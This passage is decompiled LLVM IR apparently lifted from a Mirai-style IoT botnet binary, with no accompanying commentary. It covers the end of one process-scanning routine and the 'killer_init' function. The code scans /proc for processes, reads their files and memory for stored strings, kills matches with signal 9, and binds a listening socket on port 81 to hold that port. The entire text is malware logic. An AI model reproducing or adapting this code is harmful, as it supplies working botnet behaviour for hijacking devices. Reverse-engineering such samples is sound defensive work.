dec_label_pc_10005d94:                            ; preds = %dec_label_pc_10005d74
  store i32 268459416, i32* @lr, align 4
  %v0_10005d94 = call i32 @util_zero()
  %v3_10005da0 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_100059a8, i32* @r3, align 4
  %v3_10005dac = call i32 @util_strcpy(i8* %v2_10005cc0, i32 %v3_10005da0)
  store i32 268459448, i32* @lr, align 4
  %v2_10005db4 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v0_10005db8 = load i32, i32* @r30, align 4
  %v1_10005dbc = load i32, i32* @r27, align 4
  %v2_10005dbc = add i32 %v1_10005dbc, %v2_10005db4
  store i32 %v2_10005dbc, i32* @r3, align 4
  %v2_10005dc0 = inttoptr i32 %v2_10005dbc to i8*
  %v3_10005dc0 = call i32 @util_strcpy(i8* %v2_10005dc0, i32 %v0_10005db8)
  store i32 268459468, i32* @lr, align 4
  %v2_10005dc8 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v3_10005dd8 = call i32 @table_retrieve_val(i32 8, i32* null)
  %v1_10005de0 = load i32, i32* @r27, align 4
  %v2_10005de0 = add i32 %v1_10005de0, %v2_10005dc8
  store i32 %v2_10005de0, i32* @r3, align 4
  %v2_10005de4 = inttoptr i32 %v2_10005de0 to i8*
  %v3_10005de4 = call i32 @util_strcpy(i8* %v2_10005de4, i32 %v3_10005dd8)
  store i32 268459504, i32* @lr, align 4
  %v2_10005dec = call i32 @util_strlen(i8* %v2_10005cc0)
  %v0_10005df0 = load i32, i32* @r22, align 4
  %v1_10005df4 = load i32, i32* @r27, align 4
  %v2_10005df4 = add i32 %v1_10005df4, %v2_10005dec
  store i32 %v2_10005df4, i32* @r3, align 4
  %v2_10005df8 = inttoptr i32 %v2_10005df4 to i8*
  %v3_10005df8 = call i32 @util_strcpy(i8* %v2_10005df8, i32 %v0_10005df0)
  store i32 268459524, i32* @lr, align 4
  %v2_10005e00 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v0_10005e04 = load i32, i32* %r31.global-to-local, align 4
  %v1_10005e04 = add i32 %v0_10005e04, 11
  %v1_10005e08 = load i32, i32* @r27, align 4
  %v2_10005e08 = add i32 %v1_10005e08, %v2_10005e00
  store i32 %v2_10005e08, i32* @r3, align 4
  %v2_10005e0c = inttoptr i32 %v2_10005e08 to i8*
  %v3_10005e0c = call i32 @util_strcpy(i8* %v2_10005e0c, i32 %v1_10005e04)
  store i32 268459552, i32* @lr, align 4
  %v3_10005e1c = call i32 @readlink(i32 %v2_100059a8, i32 %v2_100059b0, i32 4096)
  %v3_10005e20 = icmp eq i32 %v3_10005e1c, -1
  br i1 %v3_10005e20, label %dec_label_pc_10005d74.loopexit, label %dec_label_pc_10005e2c

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005d94
  store i32 268459568, i32* @lr, align 4
  %v2_10005e2c = call i32 @util_strlen(i8* %v1_10005e2c)
  %v4_10005e3c = call i32 @util_stristr(i8* %v1_10005e2c, i32 %v2_10005e2c, i32 %v2_10005a88)
  %v3_10005e44 = icmp eq i32 %v4_10005e3c, -1
  %v0_10005e48 = load i32, i32* @r30, align 4
  store i32 %v0_10005e48, i32* @r3, align 4
  br i1 %v3_10005e44, label %dec_label_pc_10005d74.loopexit, label %dec_label_pc_10005e50

dec_label_pc_10005e50:                            ; preds = %dec_label_pc_10005e2c
  store i32 268459604, i32* @lr, align 4
  %v2_10005e50 = call i32 @util_atoi(i32 %v0_10005e48, i32 10)
  store i32 268459612, i32* @lr, align 4
  %v2_10005e58 = call i32 @kill(i32 %v2_10005e50, i32 9)
  %v0_10005e5c = load i32, i32* %r25.global-to-local, align 4
  store i32 268459620, i32* @lr, align 4
  %v1_10005e60 = inttoptr i32 %v0_10005e5c to i32*
  %v2_10005e60 = call i32 @__GI_readdir(i32* %v1_10005e60)
  store i32 1, i32* @r28, align 4
  store i32 %v2_10005e60, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005e7c

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005d74, %dec_label_pc_10005e50
  %v0_10005e7c = load i32, i32* %r25.global-to-local, align 4
  store i32 268459652, i32* @lr, align 4
  %v1_10005e80 = inttoptr i32 %v0_10005e7c to i32*
  %v2_10005e80 = call i32 @__GI_closedir(i32* %v1_10005e80)
  %v0_10005e84 = load i32, i32* @r23, align 4
  store i32 268459660, i32* @lr, align 4
  %v1_10005e88 = inttoptr i32 %v0_10005e84 to i32*
  %v2_10005e88 = call i32 @__GI_readdir(i32* %v1_10005e88)
  %v3_10005e8c = icmp eq i32 %v2_10005e88, 0
  br i1 %v3_10005e8c, label %dec_label_pc_10005e94, label %dec_label_pc_10005c8c

dec_label_pc_10005e94:                            ; preds = %dec_label_pc_10005c7c.loopexit, %dec_label_pc_10005e7c, %dec_label_pc_10005c8c, %dec_label_pc_10005c70
  %v0_10005e94 = load i32, i32* @r23, align 4
  %v0_10005e98 = load i32, i32* @r28, align 4
  %v1_10005e98 = urem i32 %v0_10005e98, 256
  store i32 %v1_10005e98, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005ea0.96 to i32), i32* @lr, align 4
  %v1_10005e9c = inttoptr i32 %v0_10005e94 to i32*
  %v2_10005e9c = call i32 @__GI_closedir(i32* %v1_10005e9c)
  br label %dec_label_pc_10005ea0

dec_label_pc_10005ea0:                            ; preds = %dec_label_pc_10005c54, %dec_label_pc_10005e94
  store i32 ptrtoint ([3 x i8]* @global_var_10005ea8.97 to i32), i32* @lr, align 4
  %v1_10005ea4 = call i32 @sleep(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_10005eb0.98 to i32), i32* @lr, align 4
  %v1_10005eac = call i32 @table_lock_val(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10005eb8.99 to i32), i32* @lr, align 4
  %v1_10005eb4 = call i32 @table_lock_val(i32 7)
  store i32 ptrtoint ([3 x i8]* @global_var_10005ec0.100 to i32), i32* @lr, align 4
  %v1_10005ebc = call i32 @table_lock_val(i32 8)
  store i32 268459720, i32* @lr, align 4
  %v1_10005ec4 = call i32 @table_lock_val(i32 9)
  br label %dec_label_pc_10005ec8

dec_label_pc_10005ec8:                            ; preds = %dec_label_pc_10005a40, %dec_label_pc_10005ea0
  %v0_10005ecc = load i32, i32* @r31, align 4
  store i32 %v0_100059dc, i32* @r22, align 4
  store i32 %v0_100059e0, i32* @r23, align 4
  store i32 %v0_100059a4, i32* @r27, align 4
  store i32 %v0_100059e8, i32* @r28, align 4
  store i32 %v0_100059b4, i32* @r29, align 4
  store i32 %v0_100059d4, i32* @r31, align 4
  ret i32 %v0_10005ecc

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005b80
  %v3_10005f04 = icmp eq i32 %v0_10005bb479, 0
  %v1_10005f08 = add i32 %v0_10005bb479, 1
  br i1 %v3_10005f04, label %dec_label_pc_10005f10, label %dec_label_pc_10005b84

dec_label_pc_10005f10:                            ; preds = %dec_label_pc_10005f04
  %v2_10005f10 = add i32 %v1_10005ba883, %v0_10005b5c
  %v1_10005f14 = add i32 %v2_10005f10, 33
  %v2_10005f14 = inttoptr i32 %v1_10005f14 to i8*
  %v3_10005f14 = load i8, i8* %v2_10005f14, align 1
  %v4_10005f14 = zext i8 %v3_10005f14 to i32
  %v3_10005f18 = icmp eq i8 %v3_10005f14, 65
  br i1 %v3_10005f18, label %dec_label_pc_10005f20, label %dec_label_pc_10005b6c

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005f10
  store i32 1, i32* @r8, align 4
  br label %dec_label_pc_10005b6c.outer

dec_label_pc_10005f28:                            ; preds = %dec_label_pc_10005af4, %dec_label_pc_10005ae4
  %v0_10005b34.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005b2c

dec_label_pc_10005f30:                            ; preds = %dec_label_pc_10005c3c
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005f3c.101 to i32), i32* @lr, align 4
  %v1_10005f38 = call i32 @table_lock_val(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10005f44.102 to i32), i32* @lr, align 4
  %v1_10005f40 = call i32 @table_lock_val(i32 7)
  store i32 ptrtoint ([3 x i8]* @global_var_10005f4c.103 to i32), i32* @lr, align 4
  %v1_10005f48 = call i32 @table_lock_val(i32 8)
  store i32 268459860, i32* @lr, align 4
  %v1_10005f50 = call i32 @table_lock_val(i32 9)
  %v0_10005f58 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100059dc, i32* @r22, align 4
  store i32 %v0_100059e0, i32* @r23, align 4
  store i32 %v0_100059a4, i32* @r27, align 4
  store i32 %v0_100059e8, i32* @r28, align 4
  store i32 %v0_100059b4, i32* @r29, align 4
  store i32 %v0_100059d4, i32* @r31, align 4
  ret i32 %v0_10005f58

dec_label_pc_10005f90:                            ; preds = %entry
  store i8 48, i8* %stack_var_-8776, align 1
  br label %dec_label_pc_10005a40

; uselistorder directives
  uselistorder i32 %v2_10005e88, { 1, 0 }
  uselistorder i32 %v1_10005ba8.lcssa, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_10005bbc78, { 1, 0 }
  uselistorder i32 %v0_10005bb479, { 2, 1, 4, 0, 3 }
  uselistorder i32 %v1_10005ba883, { 6, 0, 1, 2, 4, 5, 7, 3 }
  uselistorder i32 %v0_10005b04, { 1, 0 }
  uselistorder i32 %v1_10005b34, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_10005a88, { 1, 0, 2 }
  uselistorder i32 %v2_100059c8, { 1, 0, 2 }
  uselistorder i32 %v2_100059a8, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i8* %stack_var_-8776, { 2, 0, 1 }
  uselistorder i8* %stack_var_-8760, { 1, 3, 0, 2 }
  uselistorder i32* %stack_var_-8792, { 0, 1, 3, 2 }
  uselistorder i32* %r25.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder i32 268459140, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100100d0.27 to i32), { 1, 0 }
  uselistorder i8 58, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder i32 268458652, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec8, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10005e94, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10005e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005d74, { 1, 0 }
  uselistorder label %dec_label_pc_10005d74.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10005c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10005c8c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10005c7c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005bc4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10005bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10005b84, { 1, 0 }
  uselistorder label %dec_label_pc_10005b6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10005a8c.backedge, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10005aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10005a40, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %stack_var_-552 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %v0_10005fc0 = load i32, i32* @r30, align 4
  %v0_10005fc8 = load i32, i32* @r22, align 4
  %v0_10005fd4 = load i32, i32* @r25, align 4
  %v0_10005fd8 = load i32, i32* @r26, align 4
  %v0_10005fdc = load i32, i32* @r27, align 4
  %v0_10005fe0 = load i32, i32* @r28, align 4
  %v0_10005fe4 = load i32, i32* @r29, align 4
  %v0_10005fe8 = load i32, i32* @r31, align 4
  %v0_10005fec = call i32 @__GI_time()
  store i32 %v0_10005fec, i32* %r30.global-to-local, align 4
  store i32 268460024, i32* @lr, align 4
  %v0_10005ff4 = call i32 @__libc_fork()
  store i32 %v0_10005ff4, i32* @global_var_100211e8.92, align 4
  %tmp38 = icmp slt i32 %v0_10005ff4, 1
  br i1 %tmp38, label %dec_label_pc_10006040, label %dec_label_pc_10006008

dec_label_pc_10006008:                            ; preds = %dec_label_pc_100060b0, %dec_label_pc_10006040, %entry
  %v0_1000603c = phi i32 [ -1, %dec_label_pc_10006040 ], [ %v0_10005ff4, %entry ], [ 0, %dec_label_pc_100060b0 ]
  store i32 %v0_10005fc8, i32* @r22, align 4
  store i32 %v0_10005fd4, i32* @r25, align 4
  store i32 %v0_10005fd8, i32* @r26, align 4
  store i32 %v0_10005fdc, i32* @r27, align 4
  store i32 %v0_10005fe0, i32* %r28.global-to-local, align 4
  store i32 %v0_10005fe4, i32* %r29.global-to-local, align 4
  store i32 %v0_10005fc0, i32* @r30, align 4
  store i32 %v0_10005fe8, i32* @r31, align 4
  ret i32 %v0_1000603c

dec_label_pc_10006040:                            ; preds = %entry
  %v3_10006040 = icmp eq i32 %v0_10005ff4, -1
  br i1 %v3_10006040, label %dec_label_pc_10006008, label %dec_label_pc_10006048

dec_label_pc_10006048:                            ; preds = %dec_label_pc_10006040
  store i32 2, i32* %stack_var_-632, align 4
  store i32 268460128, i32* @lr, align 4
  %v1_1000605c = call i32 @killer_kill_by_port(i32 81)
  %v3_10006060 = icmp eq i32 %v1_1000605c, 0
  br i1 %v3_10006060, label %dec_label_pc_10006068, label %dec_label_pc_100062d8

dec_label_pc_10006068:                            ; preds = %dec_label_pc_10006048, %dec_label_pc_100062d8, %dec_label_pc_100062fc
  store i32 -859045888, i32* @r22, align 4
  store i32 268460148, i32* @lr, align 4
  %v1_10006070 = call i32 @sleep(i32 5)
  store i32 ptrtoint (i32* @global_var_1000607c.104 to i32), i32* @lr, align 4
  %v1_10006078 = call i32 @malloc(i32 4096)
  %v2_10006078 = inttoptr i32 %v1_10006078 to i8*
  store i32 0, i32* %r10.global-to-local, align 4
  store i8 0, i8* %v2_10006078, align 1
  %v0_10006090 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10006090, i32* @global_var_100211e4.105, align 4
  %v0_10006094 = load i32, i32* @r30, align 4
  store i32 %v0_10006094, i32* %r29.global-to-local, align 4
  store i32 %v1_10006078, i32* @global_var_100211ec.106, align 4
  %v0_1000609c = load i32, i32* @r22, align 4
  %v1_1000609c = or i32 %v0_1000609c, 52429
  store i32 %v1_1000609c, i32* @r22, align 4
  store i32 400, i32* @r28, align 4
  store i32 0, i32* @r26, align 4
  %v2_100060a8 = ptrtoint i32* %stack_var_-616 to i32
  store i32 %v2_100060a8, i32* @r25, align 4
  %v2_100060ac = ptrtoint i32* %stack_var_-552 to i32
  %v2_10006180 = bitcast i32* %stack_var_-616 to i8*
  br label %dec_label_pc_100060b0

dec_label_pc_100060b0:                            ; preds = %dec_label_pc_10006144, %dec_label_pc_10006068
  store i32 268460216, i32* @lr, align 4
  %v1_100060b4 = call i32 @table_unlock_val(i32 6)
  %v3_100060c0 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 268460232, i32* @lr, align 4
  %v1_100060c4 = call i32 @__GI_opendir(i32 %v3_100060c0)
  store i32 %v1_100060c4, i32* @r27, align 4
  %v3_100060c8 = icmp eq i32 %v1_100060c4, 0
  br i1 %v3_100060c8, label %dec_label_pc_10006008, label %dec_label_pc_100060d0

dec_label_pc_100060d0:                            ; preds = %dec_label_pc_100060b0
  store i32 268460248, i32* @lr, align 4
  %v1_100060d4 = call i32 @table_lock_val(i32 6)
  %v0_100060d87 = load i32, i32* @r27, align 4
  store i32 268460256, i32* @lr, align 4
  %v1_100060dc8 = inttoptr i32 %v0_100060d87 to i32*
  %v2_100060dc9 = call i32 @__GI_readdir(i32* %v1_100060dc8)
  %v3_100060e012 = icmp eq i32 %v2_100060dc9, 0
  br i1 %v3_100060e012, label %dec_label_pc_10006144, label %dec_label_pc_100060e8.preheader

dec_label_pc_100060e8.preheader:                  ; preds = %dec_label_pc_100060d0, %dec_label_pc_100060d8.backedge
  %v0_100060e814 = phi i32 [ %v2_100060dc, %dec_label_pc_100060d8.backedge ], [ %v2_100060dc9, %dec_label_pc_100060d0 ]
  br label %dec_label_pc_100060e8

dec_label_pc_100060e8:                            ; preds = %dec_label_pc_100060e8.preheader, %dec_label_pc_10006130
  %v0_100060fc = phi i32 [ %v0_100060e814, %dec_label_pc_100060e8.preheader ], [ %v2_10006138, %dec_label_pc_10006130 ]
  %v1_100060e8 = add i32 %v0_100060fc, 11
  %v2_100060e8 = inttoptr i32 %v1_100060e8 to i8*
  %v3_100060e8 = load i8, i8* %v2_100060e8, align 1
  %v4_100060e8 = zext i8 %v3_100060e8 to i32
  %v1_100060ec = add nuw nsw i32 %v4_100060e8, 208
  %v1_100060f0 = urem i32 %v1_100060ec, 256
  %v2_100060f4 = icmp ugt i32 %v1_100060f0, 9
  br i1 %v2_100060f4, label %dec_label_pc_100060d8.backedge, label %dec_label_pc_100060fc

dec_label_pc_100060fc:                            ; preds = %dec_label_pc_100060e8
  store i32 %v1_100060e8, i32* @r31, align 4
  store i32 %v1_100060e8, i32* @r3, align 4
  %v0_10006108 = load i32, i32* @r26, align 4
  %v1_10006108 = add i32 %v0_10006108, 1
  store i32 %v1_10006108, i32* @r26, align 4
  store i32 268460304, i32* @lr, align 4
  %v2_1000610c = call i32 @util_atoi(i32 %v1_100060e8, i32 10)
  %v0_10006110 = load i32, i32* @r28, align 4
  %v2_10006110 = icmp slt i32 %v0_10006110, %v2_1000610c
  store i32 %v2_1000610c, i32* %r30.global-to-local, align 4
  br i1 %v2_10006110, label %dec_label_pc_10006150, label %dec_label_pc_1000611c

dec_label_pc_1000611c:                            ; preds = %dec_label_pc_100060fc
  %v0_10006120 = call i32 @__GI_time()
  %v0_10006124 = load i32, i32* @r29, align 4
  %v2_10006124 = sub i32 %v0_10006120, %v0_10006124
  %tmp39 = icmp slt i32 %v2_10006124, 601
  br i1 %tmp39, label %dec_label_pc_1000629c, label %dec_label_pc_10006130

dec_label_pc_10006130:                            ; preds = %dec_label_pc_1000611c
  %v0_10006130 = load i32, i32* @r27, align 4
  store i32 400, i32* @r28, align 4
  store i32 268460348, i32* @lr, align 4
  %v1_10006138 = inttoptr i32 %v0_10006130 to i32*
  %v2_10006138 = call i32 @__GI_readdir(i32* %v1_10006138)
  %v3_1000613c = icmp eq i32 %v2_10006138, 0
  br i1 %v3_1000613c, label %dec_label_pc_10006144, label %dec_label_pc_100060e8

dec_label_pc_10006144:                            ; preds = %dec_label_pc_100060d8.backedge, %dec_label_pc_10006130, %dec_label_pc_100060d0
  %v0_10006144 = load i32, i32* @r27, align 4
  store i32 268460364, i32* @lr, align 4
  %v1_10006148 = inttoptr i32 %v0_10006144 to i32*
  %v2_10006148 = call i32 @__GI_closedir(i32* %v1_10006148)
  br label %dec_label_pc_100060b0

dec_label_pc_10006150:                            ; preds = %dec_label_pc_100060fc
  %v0_10006154 = call i32 @__GI_time()
  store i32 %v0_10006154, i32* %r24.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006164.108 to i32), i32* @lr, align 4
  %v1_10006160 = call i32 @table_unlock_val(i32 6)
  store i32 268460396, i32* @lr, align 4
  %v1_10006168 = call i32 @table_unlock_val(i32 10)
  %v3_10006174 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_100060a8, i32* @r3, align 4
  %v3_10006180 = call i32 @util_strcpy(i8* %v2_10006180, i32 %v3_10006174)
  %v0_10006184 = load i32, i32* @r31, align 4
  %v1_10006188 = load i32, i32* @r25, align 4
  %v2_10006188 = add i32 %v1_10006188, %v3_10006180
  store i32 %v2_10006188, i32* %r28.global-to-local, align 4
  store i32 %v2_10006188, i32* @r3, align 4
  %v2_10006190 = inttoptr i32 %v2_10006188 to i8*
  %v3_10006190 = call i32 @util_strcpy(i8* %v2_10006190, i32 %v0_10006184)
  store i32 %v3_10006190, i32* %r29.global-to-local, align 4
  %v3_100061a0 = call i32 @table_retrieve_val(i32 10, i32* null)
  %v2_100061a8 = add i32 %v2_10006188, %v3_10006190
  store i32 %v2_100061a8, i32* @r3, align 4
  %v2_100061ac = inttoptr i32 %v2_100061a8 to i8*
  %v3_100061ac = call i32 @util_strcpy(i8* %v2_100061ac, i32 %v3_100061a0)
  store i32 ptrtoint ([3 x i8]* @global_var_100061b8.110 to i32), i32* @lr, align 4
  %v1_100061b4 = call i32 @table_lock_val(i32 6)
  store i32 268460480, i32* @lr, align 4
  %v1_100061bc = call i32 @table_lock_val(i32 10)
  store i32 %v2_100060a8, i32* @r3, align 4
  %v2_100061cc = call i32 @__libc_open(i32 %v2_100060a8, i32 0)
  %v3_100061d0 = icmp eq i32 %v2_100061cc, -1
  store i32 %v2_100061cc, i32* @r31, align 4
  br i1 %v3_100061d0, label %dec_label_pc_1000627c, label %dec_label_pc_100061dc

dec_label_pc_100061dc:                            ; preds = %dec_label_pc_10006150
  store i32 268460516, i32* @lr, align 4
  %v1_100061e0 = call i32 @table_unlock_val(i32 62)
  %v0_100061e443 = load i32, i32* @r31, align 4
  store i32 %v0_100061e443, i32* @r3, align 4
  %v1_100061f044 = call i32 @__libc_read(i32 %v0_100061e443)
  store i32 %v1_100061f044, i32* %r28.global-to-local, align 4
  %tmp4046 = icmp slt i32 %v1_100061f044, 1
  br i1 %tmp4046, label %dec_label_pc_100062c4, label %dec_label_pc_100061fc

dec_label_pc_100061fc:                            ; preds = %dec_label_pc_100061dc, %dec_label_pc_100061e4.backedge
  %v3_10006204 = call i32 @table_retrieve_val(i32 62, i32* null)
  store i32 %v3_10006204, i32* %r29.global-to-local, align 4
  %v3_10006214 = call i32 @table_retrieve_val(i32 62, i32* null)
  store i32 268460572, i32* @lr, align 4
  %v1_10006218 = inttoptr i32 %v3_10006214 to i8*
  %v2_10006218 = call i32 @util_strlen(i8* %v1_10006218)
  %v0_1000621c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000621c = icmp slt i32 %v0_1000621c, %v2_10006218
  br i1 %v2_1000621c, label %dec_label_pc_100061e4.backedge, label %dec_label_pc_10006224

dec_label_pc_10006224:                            ; preds = %dec_label_pc_100061fc
  %v1_10006224 = add i32 %v0_1000621c, 1
  store i32 %v1_10006224, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_100062346 = icmp eq i32 %v0_1000621c, 0
  br i1 %v2_100062346, label %dec_label_pc_100061e4.backedge, label %dec_label_pc_10006238.lr.ph

dec_label_pc_100061e4.backedge:                   ; preds = %dec_label_pc_1000624c, %dec_label_pc_10006224, %dec_label_pc_100061fc
  %v0_100061e4 = load i32, i32* @r31, align 4
  store i32 %v0_100061e4, i32* @r3, align 4
  %v1_100061f0 = call i32 @__libc_read(i32 %v0_100061e4)
  store i32 %v1_100061f0, i32* %r28.global-to-local, align 4
  %tmp40 = icmp slt i32 %v1_100061f0, 1
  br i1 %tmp40, label %dec_label_pc_100062c4, label %dec_label_pc_100061fc

dec_label_pc_10006238.lr.ph:                      ; preds = %dec_label_pc_10006224
  %v0_10006238.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006238

dec_label_pc_10006238:                            ; preds = %dec_label_pc_10006238.lr.ph, %dec_label_pc_1000624c
  %v0_10006234 = phi i32 [ %v0_1000621c, %dec_label_pc_10006238.lr.ph ], [ %v1_10006234, %dec_label_pc_1000624c ]
  %v0_1000624c = phi i32 [ %v2_100060ac, %dec_label_pc_10006238.lr.ph ], [ %v1_1000624c, %dec_label_pc_1000624c ]
  %v0_10006254 = phi i32 [ 0, %dec_label_pc_10006238.lr.ph ], [ %v1_1000623817, %dec_label_pc_1000624c ]
  %v2_10006238 = add i32 %v0_10006254, %v0_10006238.pre
  %v3_10006238 = inttoptr i32 %v2_10006238 to i8*
  %v4_10006238 = load i8, i8* %v3_10006238, align 1
  %v1_1000623c = inttoptr i32 %v0_1000624c to i8*
  %v2_1000623c = load i8, i8* %v1_1000623c, align 1
  %v4_10006240 = icmp eq i8 %v2_1000623c, %v4_10006238
  br i1 %v4_10006240, label %dec_label_pc_10006254, label %dec_label_pc_10006248

dec_label_pc_10006248:                            ; preds = %dec_label_pc_10006238
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000624c

dec_label_pc_1000624c:                            ; preds = %dec_label_pc_10006254, %dec_label_pc_10006248
  %v1_1000623817 = phi i32 [ %v1_10006254, %dec_label_pc_10006254 ], [ 0, %dec_label_pc_10006248 ]
  %v1_1000624c = add i32 %v0_1000624c, 1
  %v1_10006234 = add i32 %v0_10006234, -1
  %v2_10006234 = icmp eq i32 %v1_10006234, 0
  br i1 %v2_10006234, label %dec_label_pc_100061e4.backedge, label %dec_label_pc_10006238

dec_label_pc_10006254:                            ; preds = %dec_label_pc_10006238
  %v1_10006254 = add i32 %v0_10006254, 1
  store i32 %v1_10006254, i32* %r10.global-to-local, align 4
  %v4_10006258 = icmp eq i32 %v2_10006218, %v1_10006254
  br i1 %v4_10006258, label %dec_label_pc_10006260, label %dec_label_pc_1000624c

dec_label_pc_10006260:                            ; preds = %dec_label_pc_10006254
  store i32 268460648, i32* @lr, align 4
  %v1_10006264 = call i32 @table_lock_val(i32 62)
  %v0_10006268 = load i32, i32* @r31, align 4
  store i32 %v0_10006268, i32* @r3, align 4
  %v0_1000626c = call i32 @__GI___libc_close()
  %v0_10006270 = load i32, i32* %r30.global-to-local, align 4
  store i32 268460668, i32* @lr, align 4
  %v2_10006278 = call i32 @kill(i32 %v0_10006270, i32 9)
  br label %dec_label_pc_1000627c

dec_label_pc_1000627c:                            ; preds = %dec_label_pc_10006150, %dec_label_pc_100062c4, %dec_label_pc_10006260
  store i32 %v2_100060a8, i32* @r3, align 4
  store i32 64, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006288.112 to i32), i32* @lr, align 4
  %v0_10006284 = call i32 @util_zero()
  store i32 268460688, i32* @lr, align 4
  %v1_1000628c = call i32 @sleep(i32 1)
  %v0_10006290 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10006290, i32* @r28, align 4
  %v0_10006294 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10006294, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100060d8.backedge

dec_label_pc_100060d8.backedge:                   ; preds = %dec_label_pc_100060e8, %dec_label_pc_1000627c, %dec_label_pc_100062b8, %dec_label_pc_1000629c, %dec_label_pc_100062a4
  %v0_100060d8 = load i32, i32* @r27, align 4
  store i32 268460256, i32* @lr, align 4
  %v1_100060dc = inttoptr i32 %v0_100060d8 to i32*
  %v2_100060dc = call i32 @__GI_readdir(i32* %v1_100060dc)
  %v3_100060e0 = icmp eq i32 %v2_100060dc, 0
  br i1 %v3_100060e0, label %dec_label_pc_10006144, label %dec_label_pc_100060e8.preheader

dec_label_pc_1000629c:                            ; preds = %dec_label_pc_1000611c
  %v0_1000629c = load i32, i32* %r30.global-to-local, align 4
  %tmp41 = icmp slt i32 %v0_1000629c, 401
  br i1 %tmp41, label %dec_label_pc_100060d8.backedge, label %dec_label_pc_100062a4

dec_label_pc_100062a4:                            ; preds = %dec_label_pc_1000629c
  %v0_100062a4 = load i32, i32* @r26, align 4
  %v1_100062a4 = load i32, i32* @r22, align 4
  %v2_100062a4 = zext i32 %v0_100062a4 to i64
  %v3_100062a4 = zext i32 %v1_100062a4 to i64
  %v4_100062a4 = mul nuw i64 %v3_100062a4, %v2_100062a4
  %v1_100062a81 = udiv i64 %v4_100062a4, 34359738368
  %v1_100062a8 = trunc i64 %v1_100062a81 to i32
  %v1_100062ac = mul i32 %v1_100062a8, 10
  %v4_100062b0 = icmp eq i32 %v0_100062a4, %v1_100062ac
  br i1 %v4_100062b0, label %dec_label_pc_100062b8, label %dec_label_pc_100060d8.backedge

dec_label_pc_100062b8:                            ; preds = %dec_label_pc_100062a4
  store i32 268460736, i32* @lr, align 4
  %v1_100062bc = call i32 @sleep(i32 1)
  br label %dec_label_pc_100060d8.backedge

dec_label_pc_100062c4:                            ; preds = %dec_label_pc_100061e4.backedge, %dec_label_pc_100061dc
  store i32 268460748, i32* @lr, align 4
  %v1_100062c8 = call i32 @table_lock_val(i32 62)
  %v0_100062cc = load i32, i32* @r31, align 4
  store i32 %v0_100062cc, i32* @r3, align 4
  %v0_100062d0 = call i32 @__GI___libc_close()
  br label %dec_label_pc_1000627c

dec_label_pc_100062d8:                            ; preds = %dec_label_pc_10006048
  store i32 268460784, i32* @lr, align 4
  %v3_100062ec = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_100062f0 = icmp eq i32 %v3_100062ec, -1
  store i32 %v3_100062ec, i32* @r31, align 4
  br i1 %v3_100062f0, label %dec_label_pc_10006068, label %dec_label_pc_100062fc

dec_label_pc_100062fc:                            ; preds = %dec_label_pc_100062d8
  %v2_100062fc = ptrtoint i32* %stack_var_-632 to i32
  store i32 268460808, i32* @lr, align 4
  %v3_10006304 = call i32 @bind(i32 %v2_100062fc, i32 16, i32 16)
  %v0_10006308 = load i32, i32* @r31, align 4
  store i32 268460820, i32* @lr, align 4
  %v2_10006310 = call i32 @listen(i32 %v0_10006308, i32 1)
  br label %dec_label_pc_10006068

; uselistorder directives
